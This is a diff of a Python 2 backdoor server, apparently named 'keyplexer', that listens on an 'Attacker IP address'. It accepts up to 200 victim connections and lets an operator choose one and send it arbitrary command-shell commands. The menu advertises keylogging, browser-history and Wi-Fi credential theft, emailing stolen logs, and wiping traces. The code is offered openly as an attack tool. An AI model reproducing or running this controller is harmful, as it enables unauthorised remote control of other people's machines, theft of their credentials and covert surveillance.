@@ -1,9 +1,7 @@
-#!/usr/bin/python
-
 import subprocess 
-import socket
+from socket import *
 import time
-import sys
+import sys, os
 
 """ This module for creating quick backdoors
     servers
@@ -29,10 +27,6 @@ def banner():
                       `ooo'   `---'         "-" |_|
             """
 
-host = '10.0.0.54' # Attacker IP address
-port = 443 # Port number in which the attacker server listen to
-
-
 def menu():
 
   """This function shows the server options"""
@@ -42,38 +36,41 @@ def menu():
   print "[*] refresh        ========= > Refresh the connection" #DONE
   print "[*] list           ========= > Lists all the connected clients" #DONE
 
-  
+
 def interact():
 
-  """This function to show the client interaction menu"""
-  
-  print "[*] Client options: "
+  """This is the program menu"""
+
+  print "[*] Command options: "
   print 
-  print "[*] Keylog         ========= > Start capturing keystrokes" #DONE
-  print "[*] Openwins       ========= > Get all the open program windows on the machine" #DONE
-  print "[*] Capture        ========= > take images of the host machine " #TODO
-  print "[*] Sendlogs       ========= > Sending logs and images by email" #DONE
-  print "[*] History        ========= > Gathers all browsers history" #DONE
-  print "[*] Wifi           ========= > Get Wi-Fi credentials " #DONE
-  print "[*] Status         ========= > Get the status of the machine on/off" #TODO
-  print "[*] SystemInfo     ========= > Get Fingerprint of the system" #TODO
-  print "[*] IP             ========= > Get the external IP address" #DONE
-  print "[*] Cover          ========= > Delete all traces of logs" #TODO
+  print "[*] keylog         ========= > Start capturing keystrokes" #DONE
+  print "[*] openwins       ========= > Get all the open program windows on the machine" #DONE
+  print "[*] capture        ========= > take images of the host machine " #TODO
+  print "[*] sendlogs       ========= > Sending logs and images by email" #DONE
+  print "[*] history        ========= > Gathers all browsers history" #DONE
+  print "[*] wifi           ========= > Get Wi-Fi credentials " #DONE
+  print "[*] status         ========= > Get the status of the machine on/off" #TODO
+  print "[*] systeminfo     ========= > Get Fingerprint of the system" #TODO
+  print "[*] ip             ========= > Get the external IP address" #DONE
+  print "[*] cover          ========= > Delete all traces of logs" #TODO
   print "\n\n"
   
   
 
-# create a socket object
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = '10.0.0.54' # Attacker IP address
+port = 443 # Port number in which the attacker server listen to
 
-# bind socket to the host address and port number
-sock.bind((host,port))
+# create a socket object
+sock = socket(AF_INET, SOCK_STREAM)
 
 # set timeout for the connection
 sock.settimeout(5)
 
+# bind socket to the host address and port number
+sock.bind((host,port))
+
 # define the maximun number of connection
-sock.listen(10)
+sock.listen(200)
 
 
 all_connections = []  # holds the connections
@@ -81,24 +78,24 @@ all_addresses   = []  # holds the IP addresses
 
 
 
-
 def get_multiple_clients():
     """This function handles multiple client"""
+    
     for one_conn in all_connections:
 
         # make sure to close all the connection first to avoid issues
         one_conn.close()
 
     # empty the list, delete all connections before start listening
-    del all_connections [:]
-    del all_addresses [:]
+    del all_connections[:]
+    del all_addresses[:]
 
 
     # Begin the process of accepting clients
     while True:
         
         try :
-            client_conn, addr = socket.accept()
+            client_conn, addr = sock.accept()
             
             client_conn.setblocking(1)
 
@@ -113,54 +110,162 @@ def get_multiple_clients():
     
 def backdoor_shell():
 
-      banner()
-      menu()
       
       # run while loop to initiate the resverse connection
       while True:
 
-           command = raw_input(">shell >>")
-           print 
-           if (command == "accept"):
-                get_multiple_clients()
-                print "[INFO] Done Accepting\n"
-                
-           elif(command == "list"):
-                print "--------\nClients:\n--------"
-                for item in all_addresses:
-                    print "%d - %s|%s" % (all_addresses.index(item) + 1, str(item[0]), str(item[1]))
-                print "\n"
-         
-          elif (command == "select"):
-                 pass
-                
-          # shell command to be executed
-          #user_command = raw_input("$Meterpreter_shell: >>> ")
+         print
+         # shell command to be executed
+         user_command = raw_input("~$$keyplexer: >>>  ").strip()
+          
+         # refresh the list to see the new clients
+         if user_command == "refresh":
+           
+              get_multiple_clients()
+              print
+              print bcolors.OKGREEN + "[+] Connection starts ----------------------  " 
+              print "\n"
+              
+          
+         elif user_command == "list":
+           
+              print
+              print bcolors.YELLOW + "[+] Connected Clients ----------------------  "
+              print
+              print "[+] #  | IP Address    | Port Number "
+              
+              for ip in all_addresses :
+                  
+                  print "[+] %d  |   %s   |  %s" % (all_addresses.index(ip) + 1, str(ip[0]), str(ip[1]))
+                   
+              print "\n"
 
-          elif (command == "clear"):
+          
+
+         elif ("select" in user_command):
+
+              select = int( user_command.replace("select ", "")) -1
             
-                # clears the screen
-                os.system("cls")
+              if (( select < len(all_addresses)) and (select >= 0)):
+                  interact()
+                  print
+                  print "[+][STATUS] %s | is selected" % str(all_addresses[select])
+                  print
+                  
+                  try:
+                     all_connections[select].send("whoami") # TEST AGAIN
+                     # start the interactive Meterpteter shell 
+                     #path = all_connections[select].recv(4096) + "~$$Meterpreter_Shell >>> " # DONE
+                     path = all_connections[select].recv(4096) + ">"
+                  except:
+                      print
+                      print "[-][ERROR] Client closed connection..........................\n"
+                      break
 
-          elif (command == "help"):
+                  while 1:
 
-              # help menus
-              menu()
-              interact()
-              
-          elif (command == ":kill"):
+                        # send dos commands to the victim machine
+                        dos_commands = raw_input(path)
 
-              print "[+] Disconnecting from form the victim machine ----------------"
-              break
-              
+                        if ((dos_commands != "stop") and ("cd " not in dos_commands) and ("upload " not in dos_commands)):
+                        
+                          try:
 
-              
+                            all_connections[select].send(dos_commands)
+                            message = all_connections[select].recv(4096)
+                            print message
+                            
+                          except:
+
+                            print 
+                            print "[-][ERROR] Client closed connection. stop.........................\n"
+                            break
+                          
+                        elif ("cd " in dos_commands):
+                            # cd command in cmd
+                            
+                            try :
+                              all_connections[select].send(dos_commands)  
+                              message = all_connections[select].recv(4096)
+                              path = message + ">"
+                              
+                            except:
+                              print
+                              print "[-][ERROR] Client close connection..cd........................\n"
+                              break
+
+                        else:
+
+                            print "\n"
+                            break
+
+              else:
+                    # if the command is NOT DOS command exit to the main menu
+                    #print "[+] ERROR: Command is not recognized \n"
+                    print "[-][ERROR] Client does NOT exist ............................\n"
+                   
+
+
+                 
+##         elif (user_command == "clear"):
+##                # clears the screen
+##                os.system("clear")
+##
+##
+##         elif (user_command == "help"):
+##              # help menus
+##              print
+##              menu()
+##              #interact()
+##              
+##         elif (user_command == ":kill"):
+##              print "[+] Disconnecting from form the victim machine ----------------"
+##              break
+## 
+##
+##         else:
+##              # Invalid commanfs
+##              print
+##              print bcolors.WARNING + "[ERROR] Invalid Command\n"
+##              
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[1;34m'
+    OKGREEN = '\033[1;32m'
+    WARNING = '\033[1;31m'
+    YELLOW = '\033[1;33m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    
+
 def main():
 
-      	backdoor_shell()
+   
+    	banner()
+    	menu()
+    	backdoor_shell()
 
 
 	
 
 
-main()
+#main()
+while True:
+    
+    try:
+        main()
+        
+    except KeyboardInterrupt :
+      
+        get_multiple_clients()
+        print
+        print "[+] You closed the connections ---------------------------"
+
+    except:
+    
+      get_multiple_clients()
+      
+    time.sleep(3)  # we wait 3 seconds before starting again
